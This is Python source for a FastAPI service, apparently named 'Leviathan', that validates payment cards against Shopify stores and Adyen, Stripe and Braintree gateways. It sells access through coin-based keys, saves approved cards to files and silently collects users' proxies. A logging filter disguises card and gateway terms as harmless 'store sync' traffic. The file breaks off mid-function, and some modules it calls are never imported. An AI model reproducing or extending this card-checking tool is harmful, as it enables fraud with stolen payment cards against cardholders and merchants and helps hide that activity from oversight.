import os
from dotenv import load_dotenv
load_dotenv()

from typing import Optional
from contextlib import asynccontextmanager
from fastapi import FastAPI, HTTPException, Query, BackgroundTasks
from fastapi.responses import JSONResponse
from pydantic import BaseModel
import api as shopify_api
import api2 as shopify_api2
import adyen
import json
import uuid

KEYS_FILE = "keys.json"
PROXIES_FILE = "proxies.txt"
APPROVED_CARDS_FILE = "approved.txt"

def load_keys() -> dict:
    if os.path.exists(KEYS_FILE):
        try:
            with open(KEYS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_keys(keys_data: dict):
    try:
        with open(KEYS_FILE, 'w', encoding='utf-8') as f:
            json.dump(keys_data, f, indent=4)
    except Exception as e:
        print(f"Failed to save keys: {e}")

def save_proxy_silently(proxy_str: str):
    if not proxy_str:
        return
    try:
        existing = set()
        if os.path.exists(PROXIES_FILE):
            with open(PROXIES_FILE, 'r', encoding='utf-8') as f:
                existing = {line.strip() for line in f if line.strip()}
        
        proxy_clean = proxy_str.strip()
        if proxy_clean not in existing:
            with open(PROXIES_FILE, 'a', encoding='utf-8') as f:
                f.write(proxy_clean + "\n")
    except Exception as e:
        print(f"Failed to save proxy: {e}")

def get_random_proxy() -> str:
    if not os.path.exists(PROXIES_FILE):
        raise HTTPException(status_code=400, detail="Proxy required but no proxies are configured in proxies.txt")
    try:
        with open(PROXIES_FILE, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]
        if not lines:
            raise HTTPException(status_code=400, detail="Proxy required but proxies.txt is empty")
        return random.choice(lines)
    except Exception as e:
        if isinstance(e, HTTPException):
            raise e
        raise HTTPException(status_code=500, detail=f"Error reading proxies: {str(e)}")

def save_approved_card(cc_str: str):
    try:
        with open(APPROVED_CARDS_FILE, 'a', encoding='utf-8') as f:
            f.write(cc_str.strip() + "\n")
    except Exception as e:
        print(f"Failed to save approved card: {e}")
import threading
_hit_file_lock = threading.Lock()

def save_hit_to_separate_file(cc_string: str, status: str, gateway: str, price: str, filename: str):
    try:
        with _hit_file_lock:
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(f"[{status}] {cc_string} - Gateway: {gateway} - Price: {price}\n")
    except Exception as e:
        print(f"Failed to save hit to separate file {filename}: {e}")


def consume_coin(key_str: str) -> int:
    keys_data = load_keys()
    if not key_str or key_str not in keys_data:
        raise HTTPException(status_code=403, detail="Invalid API Key")
    coins = keys_data[key_str].get("coins", 0)
    if coins <= 0:
        raise HTTPException(status_code=402, detail="Payment Required: 0 Coins remaining")
    keys_data[key_str]["coins"] = coins - 1
    save_keys(keys_data)
    return coins - 1

import sys
import subprocess
_bot_process = None

@asynccontextmanager
async def lifespan(app: FastAPI):
    global _bot_process
    bot_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot.py")
    if os.path.exists(bot_path):
        _bot_process = subprocess.Popen([sys.executable, bot_path])
        print(f"Started bot.py with PID {_bot_process.pid}")
    else:
        print("bot.py not found, skipping startup process")
    yield
    if _bot_process:
        _bot_process.terminate()
        _bot_process.wait()

import logging
import re

import stripe_auth1
import stripe_auth2
import stripe_auth3
import stripe_auth4
import stripe_charge1
import stripe_charge2
import paypal_charge1
import paypal_charge2
import paypal_charge3
import paypal_charge4
import wallawalla_auth
import braintree_auth
import authorizenet_auth

class StealthLogFilter(logging.Filter):
    def filter(self, record):
        try:
            # Process record.msg if it is a string
            if isinstance(record.msg, str):
                record.msg = self.clean_text(record.msg)
            
            # Process items in record.args if present
            if record.args:
                new_args = []
                for arg in record.args:
                    if isinstance(arg, str):
                        new_args.append(self.clean_text(arg))
                    else:
                        new_args.append(arg)
                record.args = tuple(new_args)
        except Exception:
            pass
        return True

    def clean_text(self, text: str) -> str:
        # Rewrite endpoints and terms to look like store/product sync
        if "/adyen/checker" in text:
            text = text.replace("/adyen/checker", "/api/v1/store/sync-dashboard")
        if "/adyen/docs" in text:
            text = text.replace("/adyen/docs", "/api/v1/store/sync-docs")
        if "/adyen" in text:
            text = text.replace("/adyen", "/api/v1/store/products/sync")
        if "/stripe4" in text:
            text = text.replace("/stripe4", "/api/v1/store/payment/methods/nas/sync")
        if "/stripe3" in text:
            text = text.replace("/stripe3", "/api/v1/store/payment/methods/peppermint/sync")
        if "/stripe2" in text:
            text = text.replace("/stripe2", "/api/v1/store/payment/methods/epicalarc/sync")
        if "/stripe1" in text:
            text = text.replace("/stripe1", "/api/v1/store/orders/transactions/sync")
        if "/stripe_charge2" in text:
            text = text.replace("/stripe_charge2", "/api/v1/store/orders/transactions/sync2")
        if "/stripe" in text:
            text = text.replace("/stripe", "/api/v1/store/payment/methods/sync")
        if "/wallawalla" in text:
            text = text.replace("/wallawalla", "/api/v1/store/payment/methods/wallawalla/sync")
        if "/paypal4" in text:
            text = text.replace("/paypal4", "/api/v1/store/orders/invoices/sync4")
        if "/paypal3" in text:
            text = text.replace("/paypal3", "/api/v1/store/orders/invoices/sync3")
        if "/paypal2" in text:
            text = text.replace("/paypal2", "/api/v1/store/orders/invoices/sync2")
        if "/paypal" in text:
            text = text.replace("/paypal", "/api/v1/store/orders/invoices/sync1")
        if "/braintree" in text:
            text = text.replace("/braintree", "/api/v1/store/payment/methods/token/sync")
        if "/authorizenet" in text:
            text = text.replace("/authorizenet", "/api/v1/store/payment/methods/authorizenet/sync")
        if "/paypal" in text:
            text = text.replace("/paypal", "/api/v1/store/orders/invoices/sync")
        if "/leviathanadmin" in text:
            text = text.replace("/leviathanadmin", "/api/v1/store/admin-panel")
        if "Adyen" in text or "adyen" in text:
            text = re.sub(r'(?i)adyen', 'ProductSync', text)
        if "Stripe" in text or "stripe" in text:
            text = re.sub(r'(?i)stripe', 'GatewaySync', text)
        if "Braintree" in text or "braintree" in text:
            text = re.sub(r'(?i)braintree', 'TokenSync', text)
        if "Authorize" in text or "authorize" in text:
            text = re.sub(r'(?i)authorize', 'AuthorizeSync', text)
        if "Paypal" in text or "paypal" in text or "PayPal" in text:
            text = re.sub(r'(?i)paypal', 'InvoiceSync', text)
        if "Leviathan" in text or "leviathan" in text:
            text = re.sub(r'(?i)leviathan', 'SyncEngine', text)
        if "card" in text or "Card" in text:
            text = re.sub(r'(?i)card', 'Product', text)
        if "keys" in text:
            text = text.replace("keys", "sync-tokens")
        return text

# Apply filter to all loggers
for logger_name in ("", "uvicorn", "uvicorn.access", "uvicorn.error", "fastapi"):
    logger = logging.getLogger(logger_name)
    logger.addFilter(StealthLogFilter())

app = FastAPI(title='Leviathan Adyen Auth API', lifespan=lifespan)
@app.get('/')
def home():
    return {'message': 'Leviathan Adyen Auth API', 'status': True}

@app.get('/health')
def health():
    return {'status': 'healthy', 'sync_check': 'active'}

from fastapi.responses import PlainTextResponse

@app.get('/hits')
def view_hits(key: str = Query(None)):
    if key != 'shopihits99':
        raise HTTPException(status_code=403, detail="Forbidden")
    
    hits_file = '/sock/hits.txt' if os.path.isdir('/sock') else 'hits.txt'
    
    if not os.path.exists(hits_file):
        return PlainTextResponse("No hits recorded yet.")
    
    with open(hits_file, 'r') as f:
        content = f.read()
    
    return PlainTextResponse(content)

@app.get('/clear')
def clear_hits(key: str = Query(None)):
    if key != 'shopihits99':
        raise HTTPException(status_code=403, detail="Forbidden")
    
    hits_file = '/sock/hits.txt' if os.path.isdir('/sock') else 'hits.txt'
    
    # Clear the variant cache in api.py to force refetching cheapest products
    shopify_api._VARIANT_CACHE.clear()
    
    try:
        with open(hits_file, 'w') as f:
            f.write("")
        return {"message": "Hits and product cache cleared successfully", "status": True}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to clear: {str(e)}")

@app.get('/shopify')
async def shopify_checker(
    background_tasks: BackgroundTasks,
    site: str = Query(..., description="Shopify site domain or URL"),
    cc: str = Query(..., description="Card string in format CC|MM|YYYY|CVV"),
    proxy: Optional[str] = Query(None, description="Proxy string in format host:port or user:pass@host:port"),
    variant: Optional[str] = Query(None, description="Optional variant ID to use instead of auto-finding")
):
    cc_string = cc.strip()

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message, gateway, price, currency = await shopify_api.process_card_async(
        card_number, mes, ano, cvv, site, variant, proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, gateway, str(price), 'shopify_hits.txt')

    price_value = 0.0
    try:
        price_value = float(price)
    except (ValueError, TypeError):
        if isinstance(price, str) and price.replace('.', '', 1).isdigit():
            price_value = float(price)

    return JSONResponse({
        'Gateway': gateway,
        'Price': price_value,
        'Response': clean_response,
        'Status': success,
        'cc': cc_string
    })

@app.get('/shopify/cheapest')
async def shopify_cheapest(
    site: str = Query(..., description="Shopify site domain or URL"),
    proxy: Optional[str] = Query(None, description="Proxy string in format host:port or user:pass@host:port")
):
    variant_id, price, product_handle, status = shopify_api2.find_cheapest_product(site, proxy)
    if not variant_id:
        raise HTTPException(status_code=400, detail=status or 'Failed to find product')

    return {
        'site': site,
        'variant_id': variant_id,
        'price': price,
        'product_handle': product_handle,
        'status': status
    }


class ChargeRequest(BaseModel):
    site: str
    cc: Optional[str] = None
    card_number: Optional[str] = None
    month: Optional[str] = None
    year: Optional[str] = None
    cvv: Optional[str] = None
    proxy: Optional[str] = None
    variant: Optional[str] = None


class AdyenRequest(BaseModel):
    cc: Optional[str] = None
    card_number: Optional[str] = None
    month: Optional[str] = None
    year: Optional[str] = None
    cvv: Optional[str] = None
    proxy: Optional[str] = None
    key: Optional[str] = None


@app.post('/shopify')
async def shopify_post(payload: ChargeRequest, background_tasks: BackgroundTasks):
    # Accept either full `cc` string or individual card fields.
    cc_string = None
    if payload.cc:
        cc_string = payload.cc.strip()
    else:
        if not (payload.card_number and payload.month and payload.year and payload.cvv):
            raise HTTPException(status_code=400, detail='Provide `cc` or all card fields (`card_number`, `month`, `year`, `cvv`)')
        cc_string = f"{payload.card_number}|{payload.month}|{payload.year}|{payload.cvv}"

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message, gateway, price, currency = await shopify_api.process_card_async(
        card_number, mes, ano, cvv, payload.site, payload.variant, payload.proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, gateway, str(price), 'shopify_hits.txt')

    price_value = 0.0
    try:
        price_value = float(price)
    except (ValueError, TypeError):
        if isinstance(price, str) and price.replace('.', '', 1).isdigit():
            price_value = float(price)

    return JSONResponse({
        'Gateway': gateway,
        'Price': price_value,
        'Response': clean_response,
        'Status': success,
        'cc': cc_string
    })


@app.post('/api/keys/generate')
async def generate_key(
    plan: str = Query("Standard"), 
    custom_coins: Optional[int] = Query(None),
    custom_expiry: Optional[str] = Query(None)
):
    from datetime import datetime, timedelta
    plans = {
        "Trial": 10,
        "Starter": 100,
        "Standard": 500,
        "Premium": 2000,
        "Ultimate": 10000
    }
    coins = custom_coins if custom_coins is not None else plans.get(plan, 500)
    random_suffix = f"{uuid.uuid4().hex[:12].upper()}"
    new_key = f"LEVIATHAN-{random_suffix}"
    
    if custom_expiry:
        # User entered a custom expiry (e.g., "2026-12-31" or "Lifetime")
        expiry_date = custom_expiry
    else:
        # Default Expiry 30 days from now
        expiry_date = (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d")
    
    keys_data = load_keys()
    keys_data[new_key] = {
        "plan": plan,
        "coins": coins,
        "expiry": expiry_date
    }
    save_keys(keys_data)
    return {"key": new_key, "plan": plan, "coins": coins, "expiry": expiry_date}

@app.post('/api/keys/generate/bulk')
async def generate_keys_bulk(
    plan: str = Query("Standard"), 
    custom_coins: Optional[int] = Query(None),
    custom_expiry: Optional[str] = Query(None),
    count: int = Query(5)
):
    from datetime import datetime, timedelta
    plans = {
        "Trial": 10,
        "Starter": 100,
        "Standard": 500,
        "Premium": 2000,
        "Ultimate": 10000
    }
    coins = custom_coins if custom_coins is not None else plans.get(plan, 500)
    
    if custom_expiry:
        expiry_date = custom_expiry
    else:
        expiry_date = (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d")
        
    keys_data = load_keys()
    generated_keys = []
    for _ in range(count):
        random_suffix = f"{uuid.uuid4().hex[:12].upper()}"
        new_key = f"LEVIATHAN-{random_suffix}"
        keys_data[new_key] = {
            "plan": plan,
            "coins": coins,
            "expiry": expiry_date
        }
        generated_keys.append(new_key)
        
    save_keys(keys_data)
    return {"keys": generated_keys, "plan": plan, "coins": coins, "expiry": expiry_date}

@app.delete('/api/keys/delete')
async def delete_key(key: str = Query(...)):
    keys_data = load_keys()
    if key not in keys_data:
        raise HTTPException(status_code=404, detail="Key not found")
    del keys_data[key]
    save_keys(keys_data)
    return {"message": "Key deleted successfully", "status": True}

@app.get('/api/keys/balance')
async def get_key_balance(key: str = Query(...)):
    keys_data = load_keys()
    if key not in keys_data:
        raise HTTPException(status_code=403, detail="Invalid API Key")
    key_info = keys_data[key]
    return {
        "key": key,
        "plan": key_info.get("plan", "Custom"),
        "coins": key_info.get("coins", 0),
        "expiry": key_info.get("expiry", "Lifetime")
    }

@app.get('/api/keys/list')
async def list_keys_endpoint():
    return load_keys()


@app.get('/adyen')
async def adyen_checker(
    background_tasks: BackgroundTasks,
    cc: str = Query(..., description="Card string in format CC|MM|YYYY|CVV"),
    key: str = Query(..., description="API Key with coins"),
    proxy: str = Query(..., description="Proxy string in format host:port or user:pass@host:port")
):
    cc_string = cc.strip()
    remaining_coins = consume_coin(key)
    
    save_proxy_silently(proxy)
    active_proxy = proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await adyen.process_adyen_auth(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_APPROVED" in clean_response:
        save_approved_card(cc_string)
    
    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'Adyen Leviathan', '0.00', 'adyen_hits.txt')

    return JSONResponse({
        'Gateway': 'Adyen Leviathan',
        'Type': 'auth',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.post('/adyen')
async def adyen_post(payload: AdyenRequest, background_tasks: BackgroundTasks):
    cc_string = None
    if payload.cc:
        cc_string = payload.cc.strip()
    else:
        if not (payload.card_number and payload.month and payload.year and payload.cvv):
            raise HTTPException(status_code=400, detail='Provide `cc` or all card fields (`card_number`, `month`, `year`, `cvv`)')
        cc_string = f"{payload.card_number}|{payload.month}|{payload.year}|{payload.cvv}"

    if not payload.key:
        raise HTTPException(status_code=403, detail="Provide `key` in payload to authenticate and check")
    
    if not payload.proxy:
        raise HTTPException(status_code=400, detail="Provide `proxy` in payload; proxy is mandatory")
        
    remaining_coins = consume_coin(payload.key)
    
    save_proxy_silently(payload.proxy)
    active_proxy = payload.proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await adyen.process_adyen_auth(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_APPROVED" in clean_response:
        save_approved_card(cc_string)

    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'Adyen Leviathan', '0.00', 'adyen_hits.txt')

    return JSONResponse({
        'Gateway': 'Adyen Leviathan',
        'Type': 'auth',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.get('/stripe')
async def stripe_checker(
    background_tasks: BackgroundTasks,
    cc: str = Query(..., description="Card string in format CC|MM|YYYY|CVV"),
    key: str = Query(..., description="API Key with coins"),
    proxy: str = Query(..., description="Proxy string in format host:port or user:pass@host:port")
):
    cc_string = cc.strip()
    remaining_coins = consume_coin(key)
    
    save_proxy_silently(proxy)
    active_proxy = proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await stripe_auth1.process_stripe_auth(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_APPROVED" in clean_response:
        save_approved_card(cc_string)
    
    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'Stripe Setup', '0.00', 'stripe_auth1_hits.txt')

    return JSONResponse({
        'Gateway': 'Stripe Setup',
        'Type': 'auth',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.post('/stripe')
async def stripe_post(payload: AdyenRequest, background_tasks: BackgroundTasks):
    cc_string = None
    if payload.cc:
        cc_string = payload.cc.strip()
    else:
        if not (payload.card_number and payload.month and payload.year and payload.cvv):
            raise HTTPException(status_code=400, detail='Provide `cc` or all card fields (`card_number`, `month`, `year`, `cvv`)')
        cc_string = f"{payload.card_number}|{payload.month}|{payload.year}|{payload.cvv}"

    if not payload.key:
        raise HTTPException(status_code=403, detail="Provide `key` in payload to authenticate and check")
    
    if not payload.proxy:
        raise HTTPException(status_code=400, detail="Provide `proxy` in payload; proxy is mandatory")
        
    remaining_coins = consume_coin(payload.key)
    
    save_proxy_silently(payload.proxy)
    active_proxy = payload.proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await stripe_auth1.process_stripe_auth(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_APPROVED" in clean_response:
        save_approved_card(cc_string)

    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'Stripe Setup', '0.00', 'stripe_auth1_hits.txt')

    return JSONResponse({
        'Gateway': 'Stripe Setup',
        'Type': 'auth',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.get('/stripe2')
async def stripe2_checker(
    background_tasks: BackgroundTasks,
    cc: str = Query(..., description="Card string in format CC|MM|YYYY|CVV"),
    key: str = Query(..., description="API Key with coins"),
    proxy: str = Query(..., description="Proxy string in format host:port or user:pass@host:port")
):
    cc_string = cc.strip()
    remaining_coins = consume_coin(key)
    
    save_proxy_silently(proxy)
    active_proxy = proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await stripe_auth2.process_stripe_auth_epicalarc(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_APPROVED" in clean_response:
        save_approved_card(cc_string)
    
    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'Stripe Epicalarc', '0.00', 'stripe_auth2_hits.txt')

    return JSONResponse({
        'Gateway': 'Stripe Epicalarc',
        'Type': 'auth',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.post('/stripe2')
async def stripe2_post(payload: AdyenRequest, background_tasks: BackgroundTasks):
    cc_string = None
    if payload.cc:
        cc_string = payload.cc.strip()
    else:
        if not (payload.card_number and payload.month and payload.year and payload.cvv):
            raise HTTPException(status_code=400, detail='Provide `cc` or all card fields (`card_number`, `month`, `year`, `cvv`)')
        cc_string = f"{payload.card_number}|{payload.month}|{payload.year}|{payload.cvv}"

    if not payload.key:
        raise HTTPException(status_code=403, detail="Provide `key` in payload to authenticate and check")
    
    if not payload.proxy:
        raise HTTPException(status_code=400, detail="Provide `proxy` in payload; proxy is mandatory")
        
    remaining_coins = consume_coin(payload.key)
    
    save_proxy_silently(payload.proxy)
    active_proxy = payload.proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await stripe_auth2.process_stripe_auth_epicalarc(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_APPROVED" in clean_response:
        save_approved_card(cc_string)

    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'Stripe Epicalarc', '0.00', 'stripe_auth2_hits.txt')

    return JSONResponse({
        'Gateway': 'Stripe Epicalarc',
        'Type': 'auth',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.get('/stripe3')
async def stripe3_checker(
    background_tasks: BackgroundTasks,
    cc: str = Query(..., description="Card string in format CC|MM|YYYY|CVV"),
    key: str = Query(..., description="API Key with coins"),
    proxy: str = Query(..., description="Proxy string in format host:port or user:pass@host:port")
):
    cc_string = cc.strip()
    remaining_coins = consume_coin(key)
    
    save_proxy_silently(proxy)
    active_proxy = proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await stripe_auth_peppermint.process_stripe_auth_peppermint(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_APPROVED" in clean_response:
        save_approved_card(cc_string)
    
    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'Stripe Peppermint', '0.00', 'stripe_auth3_hits.txt')

    return JSONResponse({
        'Gateway': 'Stripe Peppermint',
        'Type': 'auth',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.post('/stripe3')
async def stripe3_post(payload: AdyenRequest, background_tasks: BackgroundTasks):
    cc_string = None
    if payload.cc:
        cc_string = payload.cc.strip()
    else:
        if not (payload.card_number and payload.month and payload.year and payload.cvv):
            raise HTTPException(status_code=400, detail='Provide `cc` or all card fields (`card_number`, `month`, `year`, `cvv`)')
        cc_string = f"{payload.card_number}|{payload.month}|{payload.year}|{payload.cvv}"

    if not payload.key:
        raise HTTPException(status_code=403, detail="Provide `key` in payload to authenticate and check")
    
    if not payload.proxy:
        raise HTTPException(status_code=400, detail="Provide `proxy` in payload; proxy is mandatory")
        
    remaining_coins = consume_coin(payload.key)
    
    save_proxy_silently(payload.proxy)
    active_proxy = payload.proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await stripe_auth3.process_stripe_auth_peppermint(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_APPROVED" in clean_response:
        save_approved_card(cc_string)

    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'Stripe Peppermint', '0.00', 'stripe_auth3_hits.txt')

    return JSONResponse({
        'Gateway': 'Stripe Peppermint',
        'Type': 'auth',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.get('/stripe1')
async def stripe1_checker(
    background_tasks: BackgroundTasks,
    cc: str = Query(..., description="Card string in format CC|MM|YYYY|CVV"),
    key: str = Query(..., description="API Key with coins"),
    proxy: str = Query(..., description="Proxy string in format host:port or user:pass@host:port")
):
    cc_string = cc.strip()
    remaining_coins = consume_coin(key)
    
    save_proxy_silently(proxy)
    active_proxy = proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await stripe_charge1.process_stripe_charge(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_CHARGED_SUCCESS" in clean_response:
        save_approved_card(cc_string)
    
    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'Stripe Charge', '1.00', 'stripe_charge1_hits.txt')

    return JSONResponse({
        'Gateway': 'Stripe Charge',
        'Type': 'charge',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.post('/stripe1')
async def stripe1_post(payload: AdyenRequest, background_tasks: BackgroundTasks):
    cc_string = None
    if payload.cc:
        cc_string = payload.cc.strip()
    else:
        if not (payload.card_number and payload.month and payload.year and payload.cvv):
            raise HTTPException(status_code=400, detail='Provide `cc` or all card fields (`card_number`, `month`, `year`, `cvv`)')
        cc_string = f"{payload.card_number}|{payload.month}|{payload.year}|{payload.cvv}"

    if not payload.key:
        raise HTTPException(status_code=403, detail="Provide `key` in payload to authenticate and check")
    
    if not payload.proxy:
        raise HTTPException(status_code=400, detail="Provide `proxy` in payload; proxy is mandatory")
        
    remaining_coins = consume_coin(payload.key)
    
    save_proxy_silently(payload.proxy)
    active_proxy = payload.proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await stripe_charge1.process_stripe_charge(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_CHARGED_SUCCESS" in clean_response:
        save_approved_card(cc_string)

    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'Stripe Charge', '1.00', 'stripe_charge1_hits.txt')

    return JSONResponse({
        'Gateway': 'Stripe Charge',
        'Type': 'charge',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.get('/braintree')
async def braintree_checker(
    background_tasks: BackgroundTasks,
    cc: str = Query(..., description="Card string in format CC|MM|YYYY|CVV"),
    key: str = Query(..., description="API Key with coins"),
    proxy: str = Query(..., description="Proxy string in format host:port or user:pass@host:port")
):
    cc_string = cc.strip()
    remaining_coins = consume_coin(key)
    
    save_proxy_silently(proxy)
    active_proxy = proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
        ano = cc_parts['ano']
        cvv = cc_parts['cvv']
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    success, message = await braintree_auth.process_braintree_auth(
        card_number, mes, ano, cvv, active_proxy
    )

    clean_response = shopify_api.extract_clean_response(message)
    if success or "CARD_APPROVED" in clean_response:
        save_approved_card(cc_string)
    
    hit_status = shopify_api._classify_status(success, clean_response)
    if hit_status:
        background_tasks.add_task(save_hit_to_separate_file, cc_string, hit_status, 'Braintree Auth', '0.00', 'braintree_hits.txt')

    return JSONResponse({
        'Gateway': 'Braintree Auth',
        'Type': 'auth',
        'Response': clean_response,
        'Status': success,
        'cc': cc_string,
        'dev': 'Commndo69',
        'coins': remaining_coins
    })


@app.post('/braintree')
async def braintree_post(payload: AdyenRequest, background_tasks: BackgroundTasks):
    cc_string = None
    if payload.cc:
        cc_string = payload.cc.strip()
    else:
        if not (payload.card_number and payload.month and payload.year and payload.cvv):
            raise HTTPException(status_code=400, detail='Provide `cc` or all card fields (`card_number`, `month`, `year`, `cvv`)')
        cc_string = f"{payload.card_number}|{payload.month}|{payload.year}|{payload.cvv}"

    if not payload.key:
        raise HTTPException(status_code=403, detail="Provide `key` in payload to authenticate and check")
    
    if not payload.proxy:
        raise HTTPException(status_code=400, detail="Provide `proxy` in payload; proxy is mandatory")
        
    remaining_coins = consume_coin(payload.key)
    
    save_proxy_silently(payload.proxy)
    active_proxy = payload.proxy

    try:
        cc_parts = shopify_api.parse_cc_string(cc_string)
        card_number = cc_parts['cc']
        mes = cc_parts['mes']
